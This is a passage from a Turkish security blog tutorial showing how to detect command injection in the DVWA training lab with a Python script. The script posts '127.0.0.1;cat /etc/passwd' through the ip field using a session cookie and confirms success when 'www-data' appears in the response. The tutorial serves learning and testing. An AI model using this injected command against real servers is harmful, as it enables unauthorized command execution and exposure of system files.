+<p>Burada verilen ip adresine ping atan bir girdi bulunuyor. ip’nin devamına noktalı virgül atıp ls komutunu çalıştırmayı denediğimizde, çalıştıığını ve sunucu dizinini bize listelediğini görürürüz. Buradan hareketle bu sayfada comman injection zaafiyeti olduğunu belirleyebiliriz. Şimdi python ile nu zafiyeti nasıl tesğit edebileceğimize bakalım.</p>
+<p><img src="/images/0_64jFt9fe7MaTcEu7.png" alt=""></p>
+<p>Sayfaya gönderdiğimiz isteği burp ile dinlediğimizde bu isteğin bir POST metodu ile yapıldığını ve gönderilen parametreleri görebiliyoruz. Önceki uygulamalarda yaptığımız gibi yine oturum çerezimizi(‘PHPSESSID) header parametremize vereceğiz. Devamında POST isteği olduğu için bir data tuple yapısı oluşturacağız ve bunu post() metodumuza vereceğiz.</p>
+<pre tabindex="0"><code>import requests
+</code></pre><pre tabindex="0"><code>command = &#34;cat /etc/passwd&#34;  #çalıştırmak istediğimizz komut  
+header = {&#34;Cookie&#34;: &#34;security=low; PHPSESSID=0k6634cfi19e5sfn2vb754uns6&#34;} #oturum çerezi  
+url = &#34;http://10.0.2.4/dvwa/vulnerabilities/exec/&#34; #saldırı yapacağımız web adresi  
+data = {&#34;ip&#34;:&#34;127.0.0.1;&#34;+command,&#34;Submit&#34;:&#34;Submit&#34;} #POST metoduyla göndereceğimiz paramaetreler  
+response = requests.post(url=url, data=data, headers=header) #isteğin gönderilmesi
+</code></pre><pre tabindex="0"><code>if &#34;www-data&#34; in str(response.content):  
+  print(&#34;command injection zafiyeti bulundu!&#34;)
+</code></pre><p>‘www-data’ gelen cevapta bulunduğunda komutun çalıştığını anlayabileceğimiz bir stringden ibaret, passwd dosyası içinde bulunuyor. Bu yöntemi kullanarak daha uzun komutları sırayla python ile çalıştırabilirsiniz.</p>
+<p><img src="/images/0_HJlxB5W113qQFTkD.png" alt=""></p>
+<p>Sonuç olarak, python kodunu çalıştırarak zafiyeti bulmuş olduk.</p>
+<h3 id="son">
+  Son
+  <a class="heading-link" href="#son">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Başlık Linki"></i>
+    <span class="sr-only">Başlık Linki</span>
+  </a>
+</h3>
+<p>python ile web güvenliği alanında yapabileceğimiz başka ne tür işlemler olabilir yorumlara beklerim…</p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+  
+</section>
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+    2026
+     Yusuf Talha ARABACI 
+    ·
+    
+    Site program altyapısı <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
